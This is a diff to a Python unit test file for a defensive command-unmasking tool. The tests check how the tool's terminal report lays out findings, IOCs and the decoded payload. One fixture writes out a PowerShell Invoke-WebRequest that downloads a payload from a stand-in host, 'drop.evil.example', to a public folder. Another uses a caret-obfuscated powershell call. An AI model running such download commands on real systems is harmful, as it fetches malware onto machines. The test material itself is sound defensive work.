@@ -36,12 +36,23 @@ class TestTacticalHudLayout(unittest.TestCase):
         self.assertIn("WINWORD.EXE", out)
         self.assertIn("Exec Brief    :", out)
 
-        # Unified sequential sections without stray unnumbered headers
-        self.assertIn("[1] UNMASKING TIMELINE", out)
-        self.assertIn("[2] BEHAVIORAL EVIDENCE & CAPABILITIES", out)
-        self.assertIn("[3] EXTRACTED IOCs (DEFANGED)", out)
-        self.assertIn("[4] RECOMMENDED L1/L2 NEXT STEPS", out)
-        self.assertNotIn("READY-TO-PASTE SOC TICKET NOTE", out)
+        # Max 2 lines for Exec Brief inside the HUD box
+        brief_lines = [
+            ln for ln in out.splitlines()
+            if ln.startswith("│ Exec Brief") or (ln.startswith("│ ") and "                " in ln and "Process Chain" not in ln and "Triage Verdict" not in ln)
+        ]
+        self.assertLessEqual(len(brief_lines), 2)
+
+        # Clean 3-section top-down layout with simple bullets
+        self.assertIn("[1] FINDINGS & EVIDENCE", out)
+        self.assertIn("  \x1b[36m•\x1b[0m ", out)
+        self.assertIn("[2] IOCs & NEXT STEPS", out)
+        self.assertIn("[3] UNMASKED PAYLOAD", out)
+        self.assertNotIn("├─►", out)
+
+        # Ordering: Findings -> IOCs & Next Steps -> Unmasked Payload
+        self.assertLess(out.index("[1] FINDINGS & EVIDENCE"), out.index("[2] IOCs & NEXT STEPS"))
+        self.assertLess(out.index("[2] IOCs & NEXT STEPS"), out.index("[3] UNMASKED PAYLOAD"))
 
         self.assertNotIn("[BEHAVIORAL CAPABILITIES]", out)
         self.assertNotIn("[VERDICT RATIONALE]", out)
@@ -52,12 +63,25 @@ class TestTacticalHudLayout(unittest.TestCase):
         verdict = unmask_command("ipconfig /all", source_id="hud-ben-1")
         out = render_pretty([verdict], color=False)
 
-        self.assertIn("[1] PAYLOAD", out)
-        self.assertNotIn("[1] UNMASKING TIMELINE", out)
-        self.assertIn("[2] BEHAVIORAL EVIDENCE: None", out)
+        self.assertIn("[1] FINDINGS & EVIDENCE: None", out)
         self.assertNotIn("EXTRACTED IOCs", out)
-        self.assertIn("[3] RECOMMENDED L1/L2 NEXT STEPS", out)
+        self.assertIn("[2] IOCs & NEXT STEPS", out)
+        self.assertIn("[3] PAYLOAD", out)
+        self.assertNotIn("Step 0 [Raw Input]", out)
         self.assertNotIn("READY-TO-PASTE SOC TICKET NOTE", out)
+
+    def test_trivial_shell_normalizer_collapses_into_single_payload_unless_full(self) -> None:
+        cmd = "p^o^w^e^r^s^h^e^l^l -NoP -Command \"Write-Host 'hello'\""
+        verdict = unmask_command(cmd, source_id="hud-norm-1")
+        out_default = render_pretty([verdict], color=False, full=False)
+        self.assertIn("[3] PAYLOAD (normalized)", out_default)
+        sec3 = out_default.split("[3] PAYLOAD (normalized)")[1]
+        self.assertNotIn("Step 0 [Raw Input]", sec3)
+        self.assertNotIn("Step 1 [Shell Normalizer]", sec3)
+
+        out_full = render_pretty([verdict], color=False, full=True)
+        self.assertIn("Step 0 [Raw Input]", out_full)
+        self.assertIn("Step 1 [Shell Normalizer]", out_full)
 
     def test_no_color_uses_strict_ascii_borders_without_jagged_lines(self) -> None:
         inner = "Invoke-WebRequest -Uri http://drop.evil.example/payload.bin -OutFile C:\\Users\\Public\\p.bin"
@@ -71,12 +95,11 @@ class TestTacticalHudLayout(unittest.TestCase):
         out = render_pretty([verdict], color=False)
 
         self.assertNotIn("\x1b[", out)
-        for ch in ("╔", "║", "╚", "╭", "╮", "╰", "╯", "├─►", "└─►", "─", "│"):
+        for ch in ("╔", "║", "╚", "╭", "╮", "╰", "╯", "├─►", "└─►", "─", "│", "•"):
             self.assertNotIn(ch, out)
 
         self.assertIn("+", out)
-        self.assertIn("|--", out)
-        self.assertIn("+--", out)
+        self.assertIn("  - ", out)
 
         # Verify all HUD box lines share identical width (no jagged right border)
         box_lines = []
